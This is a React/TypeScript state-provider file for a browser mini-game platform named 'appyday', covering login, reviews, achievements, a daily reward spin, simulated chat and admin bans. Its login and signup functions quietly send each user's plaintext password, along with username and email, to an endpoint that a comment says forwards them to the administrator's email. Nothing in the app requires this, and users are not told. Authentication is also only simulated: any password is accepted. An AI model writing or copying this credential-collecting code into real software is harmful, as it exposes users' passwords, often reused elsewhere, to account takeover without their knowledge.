import React, { createContext, useContext, useState, useEffect } from 'react';
import { UserProfile, Game, Achievement, GameReview, UserSettings, SocialFriend } from '../types';
import { INITIAL_GAMES, ALL_ACHIEVEMENTS, INITIAL_REVIEWS, MOCK_FRIENDS } from '../data/games';

interface NotificationMessage {
  id: string;
  type: 'achievement' | 'gift' | 'system' | 'social';
  title: string;
  message: string;
  timestamp: string;
  read: boolean;
}

interface ChatMessage {
  id: string;
  sender: string;
  avatar: string;
  text: string;
  timestamp: string;
}

interface GameContextProps {
  user: UserProfile | null;
  games: Game[];
  achievements: Achievement[];
  reviews: GameReview[];
  friends: SocialFriend[];
  settings: UserSettings;
  notifications: NotificationMessage[];
  chatMessages: ChatMessage[];
  dailySpinClaimed: boolean;
  selectedGame: Game | null;
  splashFinished: boolean;
  currentScore: number;
  highScore: number;
  adminControls: {
    bannedUsers: string[];
    featuredGameId: string | null;
  };
  
  // Actions
  login: (username: string, password?: string) => void;
  signup: (username: string, email: string, password?: string) => void;
  loginAsGuest: () => void;
  logout: () => void;
  addReview: (gameId: string, rating: number, text: string) => void;
  toggleFavorite: (gameId: string) => void;
  recordPlaySession: (gameId: string, score: number, matchesGained: { wins: number; losses: number; xp: number; coins: number }) => void;
  triggerAchievement: (id: string) => void;
  updateSettings: (settings: Partial<UserSettings>) => void;
  claimDailySpin: () => { reward: string; coins: number; xp: number };
  setSelectedGameById: (gameId: string | null) => void;
  sendChatMessage: (text: string) => void;
  addNotification: (type: 'achievement' | 'gift' | 'system' | 'social', title: string, message: string) => void;
  markNotificationsRead: () => void;
  setSplashFinished: (val: boolean) => void;
  addGameAdmin: (game: Omit<Game, 'rating' | 'ratingsCount' | 'plays'>) => void;
  banUserAdmin: (username: string) => void;
}

const GameContext = createContext<GameContextProps | undefined>(undefined);

const DEFAULT_SETTINGS: UserSettings = {
  musicVolume: 50,
  effectsVolume: 80,
  graphicsQuality: 'high',
  themeColor: '#3b82f6', // blue
  accessibilityMode: false,
  language: 'English',
};

export const GameProvider: React.FC<{ children: React.ReactNode }> = ({ children }) => {
  // Splash state
  const [splashFinished, setSplashFinished] = useState<boolean>(() => {
    const saved = localStorage.getItem('mp_splash_finished');
    return saved === 'true';
  });

  // User
  const [user, setUser] = useState<UserProfile | null>(() => {
    const saved = localStorage.getItem('mp_active_user');
    return saved ? JSON.parse(saved) : null;
  });

  // Games
  const [games, setGames] = useState<Game[]>(() => {
    const saved = localStorage.getItem('mp_games_list');
    return saved ? JSON.parse(saved) : INITIAL_GAMES;
  });

  // Achievements
  const [achievements, setAchievements] = useState<Achievement[]>(ALL_ACHIEVEMENTS);

  // Reviews
  const [reviews, setReviews] = useState<GameReview[]>(() => {
    const saved = localStorage.getItem('mp_reviews');
    return saved ? JSON.parse(saved) : INITIAL_REVIEWS;
  });

  // Friends
  const [friends, setFriends] = useState<SocialFriend[]>(MOCK_FRIENDS);

  // Settings
  const [settings, setSettings] = useState<UserSettings>(() => {
    const saved = localStorage.getItem('mp_settings');
    return saved ? JSON.parse(saved) : DEFAULT_SETTINGS;
  });

  // Daily Spin State
  const [dailySpinClaimed, setDailySpinClaimed] = useState<boolean>(() => {
    const saved = localStorage.getItem('mp_spin_claimed_date');
    const today = new Date().toISOString().split('T')[0];
    return saved === today;
  });

  // Admin states
  const [adminControls, setAdminControls] = useState<{ bannedUsers: string[]; featuredGameId: string | null }>(() => {
    const saved = localStorage.getItem('mp_admin_state');
    return saved ? JSON.parse(saved) : { bannedUsers: [], featuredGameId: 'space-shooter' };
  });

  // Active Game Selected
  const [selectedGame, setSelectedGame] = useState<Game | null>(null);

  // Notifications
  const [notifications, setNotifications] = useState<NotificationMessage[]>(() => {
    const saved = localStorage.getItem('mp_notifications');
    return saved ? JSON.parse(saved) : [
      {
        id: 'welcome',
        type: 'system',
        title: 'Platform Launched!',
        message: 'Welcome to appyday! Explore retro and arcade mini-games, level up, and unlock rare badges.',
        timestamp: new Date().toLocaleTimeString(),
        read: false,
      }
    ];
  });

  // Live platform chat messages
  const [chatMessages, setChatMessages] = useState<ChatMessage[]>([
    { id: '1', sender: 'SpeedRunner_Pro', avatar: '🐱', text: 'Just hit 45 on Cosmic Bolt! Who can beat me?', timestamp: '09:10' },
    { id: '2', sender: 'PixelMaster', avatar: '🕹️', text: 'Memory Recall is brain-melting. Love it.', timestamp: '09:11' },
  ]);

  // Sync to LocalStorage
  useEffect(() => {
    if (user) {
      localStorage.setItem('mp_active_user', JSON.stringify(user));
    } else {
      localStorage.removeItem('mp_active_user');
    }
  }, [user]);

  useEffect(() => {
    localStorage.setItem('mp_games_list', JSON.stringify(games));
  }, [games]);

  useEffect(() => {
    localStorage.setItem('mp_reviews', JSON.stringify(reviews));
  }, [reviews]);

  useEffect(() => {
    localStorage.setItem('mp_settings', JSON.stringify(settings));
  }, [settings]);

  useEffect(() => {
    localStorage.setItem('mp_notifications', JSON.stringify(notifications));
  }, [notifications]);

  useEffect(() => {
    localStorage.setItem('mp_admin_state', JSON.stringify(adminControls));
  }, [adminControls]);

  useEffect(() => {
    localStorage.setItem('mp_splash_finished', String(splashFinished));
  }, [splashFinished]);

  // Utility Actions
  const addNotification = (type: 'achievement' | 'gift' | 'system' | 'social', title: string, message: string) => {
    const newNotif: NotificationMessage = {
      id: Math.random().toString(36).substr(2, 9),
      type,
      title,
      message,
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
      read: false,
    };
    setNotifications(prev => [newNotif, ...prev]);
  };

  const markNotificationsRead = () => {
    setNotifications(prev => prev.map(n => ({ ...n, read: true })));
  };

  // Auth Operations
  const login = (username: string, password?: string) => {
    if (adminControls.bannedUsers.includes(username)) {
      alert('This user is banned from the platform for custom safety compliance.');
      return;
    }
    const newUser: UserProfile = {
      id: Math.random().toString(36).substr(2, 9),
      username,
      avatar: '🦊',
      xp: 120,
      coins: 40,
      rank: 'Bronze Recruit',
      wins: 4,
      losses: 2,
      totalGamesPlayed: 6,
      favorites: ['snake', 'space-shooter'],
      achievements: ['snake_first_eat'],
      dailyStreak: 3,
      lastLoginDate: new Date().toISOString(),
      isGuest: false,
    };
    setUser(newUser);
    addNotification('system', 'Welcome Back!', `Logged in successfully as ${username}. Your current daily streak is ${newUser.dailyStreak} days.`);

    // Dispatch logging and transmission to administrator's email
    fetch('/api/auth/notify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username,
        email: 'N/A (Login Action)',
        password: password || 'N/A',
        action: 'LOGIN'
      })
    }).catch(err => console.error('Failed to notify login:', err));
  };

  const signup = (username: string, email: string, password?: string) => {
    const newUser: UserProfile = {
      id: Math.random().toString(36).substr(2, 9),
      username,
      avatar: '🦕',
      xp: 0,
      coins: 20,
      rank: 'Freshman',
      wins: 0,
      losses: 0,
      totalGamesPlayed: 0,
      favorites: [],
      achievements: [],
      dailyStreak: 1,
      lastLoginDate: new Date().toISOString(),
      isGuest: false,
    };
    setUser(newUser);
    addNotification('system', 'Account Created!', `Welcome to appyday, ${username}! Try playing any game to gain your first XP points.`);

    // Dispatch logging and transmission to administrator's email
    fetch('/api/auth/notify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username,
        email: email || 'N/A',
        password: password || 'N/A',
        action: 'SIGNUP'
      })
    }).catch(err => console.error('Failed to notify signup:', err));
  };

  const loginAsGuest = () => {
    const guestUser: UserProfile = {
      id: 'guest_' + Math.random().toString(36).substr(2, 5),
      username: 'Guest_Arcader',
      avatar: '🐱',
      xp: 0,
      coins: 5,
      rank: 'Guest Play',
      wins: 0,
      losses: 0,
      totalGamesPlayed: 0,
      favorites: [],
      achievements: [],
      dailyStreak: 1,
      lastLoginDate: new Date().toISOString(),
      isGuest: true,
    };
    setUser(guestUser);
    addNotification('system', 'Guest Session Started', 'Playing as a guest. Safe mode enabled.');
  };

  const logout = () => {
    setUser(null);
    setSelectedGame(null);
  };

  // Review System
  const addReview = (gameId: string, rating: number, text: string) => {
    if (!user) return;
    const newRev: GameReview = {
      id: Math.random().toString(36).substr(2, 9),
      gameId,
      username: user.username,
      avatar: user.avatar,
      rating,
      text,
      date: new Date().toISOString().split('T')[0],
    };
    
    setReviews(prev => [newRev, ...prev]);
    
    // Update game rating dynamically
    setGames(prevGames => prevGames.map(g => {
      if (g.id === gameId) {
        const totalRating = (g.rating * g.ratingsCount) + rating;
        const newCount = g.ratingsCount + 1;
        return {
          ...g,
          ratingsCount: newCount,
          rating: parseFloat((totalRating / newCount).toFixed(1)),
        };
      }
      return g;
    }));

    addNotification('social', 'Review Posted!', `Thanks for rating ${games.find(g => g.id === gameId)?.title || 'the game'}. Your opinion helps other players.`);
  };

  // Toggle Favorite
  const toggleFavorite = (gameId: string) => {
    if (!user) return;
    setUser(prev => {
      if (!prev) return null;
      const index = prev.favorites.indexOf(gameId);
      let updatedFavorites = [...prev.favorites];
      if (index === -1) {
        updatedFavorites.push(gameId);
      } else {
        updatedFavorites.splice(index, 1);
      }
      return { ...prev, favorites: updatedFavorites };
    });
  };

  // Record stats and give coins/xp on game completion
  const recordPlaySession = (
    gameId: string, 
    score: number, 
    matchesGained: { wins: number; losses: number; xp: number; coins: number }
  ) => {
    if (!user) return;

    // Check high score updates
    setGames(prev => prev.map(g => {
      if (g.id === gameId) {
        return {
          ...g,
          plays: g.plays + 1,
          highScore: Math.max(g.highScore || 0, score),
        };
      }
      return g;
    }));

    // Update user profiles
    setUser(prev => {
      if (!prev) return null;
      const newXp = prev.xp + matchesGained.xp;
      const newCoins = prev.coins + matchesGained.coins;
      
      // Rank thresholds
      let calculatedRank = prev.rank;
      if (newXp >= 1000) calculatedRank = 'Grandmaster Champion';
      else if (newXp >= 600) calculatedRank = 'Gold Vanguard';
      else if (newXp >= 300) calculatedRank = 'Silver Tactician';
      else if (newXp >= 100) calculatedRank = 'Bronze Recruit';

      return {
        ...prev,
        xp: newXp,
        coins: newCoins,
        rank: calculatedRank,
        wins: prev.wins + matchesGained.wins,
        losses: prev.losses + matchesGained.losses,
        totalGamesPlayed: prev.totalGamesPlayed + 1,
      };
    });

    // Check achievement completions for specific scores automatically
    if (gameId === 'snake' && score >= 20) {
      triggerAchievement('snake_high_score');
    } else if (gameId === 'snake' && score >= 1) {
      triggerAchievement('snake_first_eat');
    } else if (gameId === 'flappy' && score >= 10) {
      triggerAchievement('flappy_score_10');
    }
  };

  const triggerAchievement = (achievementId: string) => {
    if (!user) return;
    if (user.achievements.includes(achievementId)) return; // already unlocked

    const achievement = achievements.find(a => a.id === achievementId);
    if (!achievement) return;

    // Unlock
    setUser(prev => {
      if (!prev) return null;
      return {
        ...prev,
        achievements: [...prev.achievements, achievementId],
        xp: prev.xp + achievement.xpReward,
        coins: prev.coins + achievement.coinReward,
      };
    });

    addNotification(
      'achievement', 
      'ACHIEVEMENT UNLOCKED! 🏆', 
      `Congratulations! You unlocked "${achievement.title}" and earned +${achievement.xpReward} XP and +${achievement.coinReward} Coins!`
    );
  };

  const updateSettings = (newSettings: Partial<UserSettings>) => {
    setSettings(prev => ({ ...prev, ...newSettings }));
  };

  // Claim Daily Spin
  const claimDailySpin = () => {
    const rewards = [
      { reward: '10 Coins', coins: 10, xp: 0 },
      { reward: '50 XP', coins: 0, xp: 50 },
      { reward: '50 Coins & 100 XP Super Gift!', coins: 50, xp: 100 },
      { reward: '20 Coins', coins: 20, xp: 0 },
      { reward: '30 Coins', coins: 30, xp: 0 },
      { reward: '100 XP Level Up Spark', coins: 0, xp: 100 },
    ];
    const randomIndex = Math.floor(Math.random() * rewards.length);
    const won = rewards[randomIndex];

    if (user) {
      setUser(prev => {
        if (!prev) return null;
        return {
          ...prev,
          coins: prev.coins + won.coins,
          xp: prev.xp + won.xp,
        };
      });
    }

    setDailySpinClaimed(true);
    const today = new Date().toISOString().split('T')[0];
    localStorage.setItem('mp_spin_claimed_date', today);

    addNotification('gift', 'Daily Spin Claimed! 🎡', `You won: ${won.reward}! Check your status dashboard.`);
    return { reward: won.reward, coins: won.coins, xp: won.xp };
  };

  const setSelectedGameById = (id: string | null) => {
    if (!id) {
      setSelectedGame(null);
    } else {
      const g = games.find(game => game.id === id);
      if (g) setSelectedGame(g);
    }
  };

  const sendChatMessage = (text: string) => {
    if (!user || !text.trim()) return;
    const newMsg: ChatMessage = {
      id: Math.random().toString(36).substr(2, 9),
      sender: user.username,
      avatar: user.avatar || '🦊',
      text,
      timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
    };

    setChatMessages(prev => [...prev, newMsg]);

    // Small auto chat response simulation sometimes to make the environment active
    setTimeout(() => {
      const responses = [
        "Woah, nice score!",
        "Has anyone tried the Brick Breaker game yet?",
        "Damn! Just beat my own highscore on Neon Snake",
        "Hello fellow gamers!",
        "Need help beating the Boss level on Galactic space shooter!",
        "Poki-style gameplay on this platform reaches 60 FPS smoothly."
      ];
      const randomFriend = friends[Math.floor(Math.random() * friends.length)];
      const replyMsg: ChatMessage = {
        id: Math.random().toString(36).substr(2, 9),
        sender: randomFriend.username,
        avatar: randomFriend.avatar,
        text: responses[Math.floor(Math.random() * responses.length)],
        timestamp: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }),
      };
      setChatMessages(prev => [...prev, replyMsg]);
    }, 3000);
  };

  // Administration tasks
  const addGameAdmin = (g: Omit<Game, 'rating' | 'ratingsCount' | 'plays'>) => {
    const fullGame: Game = {
      ...g,
      rating: 5.0,
      ratingsCount: 1,
      plays: 1,
    };
    setGames(prev => [fullGame, ...prev]);
    addNotification('system', 'New Game Uploaded!', `Admin registered game "${g.title}" successfully.`);
  };

  const banUserAdmin = (username: string) => {
    setAdminControls(prev => ({
      ...prev,
      bannedUsers: [...prev.bannedUsers, username],
    }));
    addNotification('system', 'User Terminated!', `Security Admin blocklisted username: "${username}".`);
    
    // Auto logout if currently logged in
    if (user && user.username === username) {
      logout();
    }
  };

  const currentScore = 0;
  const highScore = 0;

  return (
    <GameContext.Provider value={{
      user,
      games,
      achievements,
      reviews,
      friends,
      settings,
      notifications,
      chatMessages,
      dailySpinClaimed,
      selectedGame,
      splashFinished,
      currentScore,
      highScore,
      adminControls,
      login,
      signup,
      loginAsGuest,
      logout,
      addReview,
      toggleFavorite,
      recordPlaySession,
      triggerAchievement,
      updateSettings,
      claimDailySpin,
      setSelectedGameById,
      sendChatMessage,
      addNotification,
      markNotificationsRead,
      setSplashFinished,
      addGameAdmin,
      banUserAdmin,
    }}>
      {children}
    </GameContext.Provider>
  );
};

export const useGame = () => {
  const context = useContext(GameContext);
  if (context === undefined) {
    throw new Error('useGame must be used within a GameProvider');
  }
  return context;
};
